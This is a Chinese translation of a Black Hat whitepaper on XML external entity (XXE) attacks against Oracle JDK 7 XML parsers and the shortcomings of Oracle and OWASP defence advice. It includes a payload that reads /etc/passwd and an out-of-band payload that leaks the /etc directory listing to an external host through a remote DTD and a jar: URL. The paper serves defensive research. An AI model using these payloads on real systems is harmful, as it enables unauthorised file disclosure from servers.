> 原文链接: https://www.anquanke.com//post/id/231472 


# JDK XML解析器中的XXE防御


                                阅读量   
                                **89834**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Sergey Gorbaty，文章来源：blackhat.com
                                <br>原文地址：[https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE-java-wp.pdf﻿](https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE-java-wp.pdf%EF%BB%BF)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01a5c53083f5b80311.png)](https://p5.ssl.qhimg.com/t01a5c53083f5b80311.png)



## 摘要

本文将证明许多Oracle JDK XML解析器容易受到Xml eXternal Entity（XXE）攻击。 我们还将证明现有的针对XXE攻击的Java防御措施的不足之处，并且其还无法防范恶意错误格式的XML，这会导致解析错误，并且成功加载外部实体。 我们能够达到读取文件和目录遍历的目的。我们提供了一个POC，通过不受信任的XML文件，从运行JDK 7的远程服务器中将文件名转发到到`/tmp`目录下。我们希望提高业界对XXE攻击危险性的认识。



## 1. 介绍

在本文中，我们将对使用XML外部实体的标准攻击进行概述。在下面的小节中，我们将介绍基于JDK7的XML解析器的特定畸形XML攻击场景的效果。在后面的小节中，我们将介绍权威人士推荐的防御措施，并展示它们的不足之处。

### <a class="reference-link" name="1.1%20%E8%83%8C%E6%99%AF"></a>1.1 背景

XML DTD可以由内部实体、外部实体和参数实体构建。

外部实体是对其他实体的引用，可以在当前文档之外找到。当XML解析器遇到外部实体URI时，它会扩展引用，以包含当前文档中外部链接的内容。外部实体可以引用一个文件或一个URL。

`简单的XXE payload`

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
    &lt;!DOCTYPE test [
        &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
    ]&gt;
&lt;test&gt;&amp;xxe;&lt;/test&gt;
```

### <a class="reference-link" name="1.2%20%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D"></a>1.2 攻击介绍

正如上一节中所提到的，XML解析器抛出的异常可能发生在解析的不同阶段。JDK XML实体展开器总是假设外部实体URL是良好形成的，并将尝试解析它。我们的第一个目标是确认外部实体正在被解析；因此，我们在一个实体中包含一个外部 URL。我们的第二个目标是创建一个指向无效 URL 的实体，该实体包含了由另一个外部实体扩展所产生的数据。这样的实体结构会迫使XML解析器先解析一些敏感的外部实体，然后使用特制的URL泄露解析后的数据，最后抛出一个IOException。这种情况下的IOException最常见的是影子，只有在尝试解析实体URL后才会抛出，此时攻击者已经通过攻击者控制的DNS解析器接收了数据。

`带有实体交叉引用的XXE`：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
    &lt;!DOCTYPE foo [
        &lt;!ENTITY % payload SYSTEM "file:///etc"&gt;
        &lt;!ENTITY % dtd SYSTEM "http://externallyhostedentity.com/a.dtd&gt;
        %dtd;
        %release;
    ]&gt;
&lt;foo&gt;business as usual&lt;/foo&gt;
```

`远程服务器的a.dtd`：

```
&lt;!ENTITY % nested "&lt;!ENTITY % release SYSTEM ’jar:%payload;.externallyhostedentity.com!/’&gt;"&gt;%nested;
```

有单独的a.dtd的主要原因是扩展引用不能在同一文档中引用。

上面的payload展示了攻击者如何通过监控DNS解析器或http://externallyhostedentity.com HTTP日志来了解解析器是否易受XXE攻击。此外，XML解析器可能会将`/etc`目录内容泄漏给由攻击者控制的http://externallyhostedentity.com的A记录的权威DNS解析器。



## 2. 不足的建议

Oracle JDK7文档中包含了大量关于XML解析器配置的信息。开发者首先想到的一个选项是启用`FEATURE_SECURE_PROCESSING`，以防止外部连接。

> “当`FEATURE_SECURE_PROCESSING`被启用时，建议实现者默认限制外部连接”

可惜，尽管Oracle提出了建议，但当`FEATURE_SECURE_PROCESSING`被启用时，XML解析器实际上并没有限制外部连接。在处理XXE时，Oracle没有明确的建议，但对于某些解析器，它记录了如何关闭XML外部实体的扩展，而其他解析器则没有办法关闭它。OWASP的建议只覆盖了主要的JDK解析器，并通过在大多数解析器上完全禁止获取外部DTD来应对XXE威胁。Long等人都建议为XMLReader创建一个自定义的实体解析器，但没有涵盖其他任何实体。

在下面的章节中，我们将检查每个主要的JDK XML解析器提供商，并看看它为缓解XXE提供了哪些功能。

### <a class="reference-link" name="2.1%20javax.xml.stream.XMLInputFactory"></a>2.1 javax.xml.stream.XMLInputFactory

使用这个Oracle XML factory上的`setProperty`方法，开发者可以将`javax.xml.stream.isSupportingExternalEntities`属性设置为false。不幸的是，正如我们发现的那样，设置这个属性不能正常工作，导致了一个0day漏洞，这个漏洞在`JDK 7u67`中得到了解决。

OWASP对该解析器的建议是忽略对`XML DTD`的需求，建议完全禁用外部DTD，这当然可以解决问题，但可能不符合业务需求。

### <a class="reference-link" name="2.2%20javax.xml.parsers.DocumentBuilderFactory"></a>2.2 javax.xml.parsers.DocumentBuilderFactory

OWASP建议禁用DTD，但同时也提到，如果不能完全屏蔽DTD，就应该直接禁用下面的`属性`：

[http://xml.org/sax/features/external-general-entities](http://xml.org/sax/features/external-general-entities)

[http://xml.org/sax/features/external-parameter-entities](http://xml.org/sax/features/external-parameter-entities)

遗憾的是，文档中并没有明确告诉需要禁用上述两个属性。单独禁用[http://xml.org/sax/features/external-general-entities](http://xml.org/sax/features/external-general-entities) 对前面提到的攻击没有作用。

Morgan等人和OWASP的建议都显得非常相似。

Oracle文档中的`setAttribute`方法可以用来设置`XMLConstants.ACCESS_EXTERNAL_DTD`和`XMLConstants.ACCESS_EXTERNAL_SCHEMA`属性，这将允许开发人员限制可以用来获取DTD或模式的协议。开发者应该意识到，`jar://`协议是相当危险的，应该被排除在外，因为它可以解析文件和外部托管的网站。

### <a class="reference-link" name="2.3%20javax.xml.parsers.SAXParserFactory"></a>2.3 javax.xml.parsers.SAXParserFactory

这个factory的Oracle文档中不包括任何可以帮助我们禁用外部实体处理的功能。OWASP包括从禁用DTD到仅禁用外部实体的建议。OWASP列出的防御措施与2.2中概述的防御措施类似。

### <a class="reference-link" name="2.4%20javax.xml.transform.sax.SAXTransformerFactory%E5%92%8Cjavax.xml.transform.TransformerFactory"></a>2.4 javax.xml.transform.sax.SAXTransformerFactory和javax.xml.transform.TransformerFactory

Oracle中提供了如何禁用可用于获取外部DTD和外部实体的协议的信息。遗憾的是，如果不使用`XMLConstants.ACCESS_EXTERNAL_DTD`属性禁用DTD，就无法关闭外部实体。

### <a class="reference-link" name="2.5%20javax.xml.validation.SchemaFactory%E5%92%8Cjavax.xml.validation.Validator"></a>2.5 javax.xml.validation.SchemaFactory和javax.xml.validation.Validator

这些特殊的解析器允许开发者使用`setResourceResolver`方法提供一个自定义的外部资源解析器。不幸的是，默认的参数值为`null`并不能带来安全的行为，本质上是一个无操作。开发者必须提供一个合适的解析器，否则攻击就会成功。

另一种安全的方法是利用`setProperty`方法，以`XMLConstants.ACCESS_EXTERNAL_DTD`作为第一个参数，以白名单协议作为第二个参数来减轻攻击。

### <a class="reference-link" name="2.6%20javax.xml.bind.Unmarshaller%E5%92%8Cjavax.xml.xpath.XPathExpression"></a>2.6 javax.xml.bind.Unmarshaller和javax.xml.xpath.XPathExpression

正如Oracle文档所提示的那样，在解析外部实体方面，没有办法修改`Unmarshaller`的行为。

> 目前在Unmarshaller上没有任何属性需要被所有JAXB Providers支持”。

`XPathExpression`根本没有暴露任何设置属性的公共方法。

让这两个解析器安全可用的唯一选择是先使用不同的安全解析器解析XML，然后将结果传递进来。例如，对于`Unmarshaller`，开发者需要制作一个安全的`java.xml.transform.Source`，并将其传递给`unmarshal`方法。而对于`XPathExpression`，则需要将一个安全解析过的`org.xml.sax.InputSource`传给`evaluate(...)`方法。



## 3. 结论

在防止XXE攻击方面，每个JDK解析器都有特定的配置。重要的是要配置`处理不正确输入`的解析器，以及处理正确但明知会产生错误的解析器。
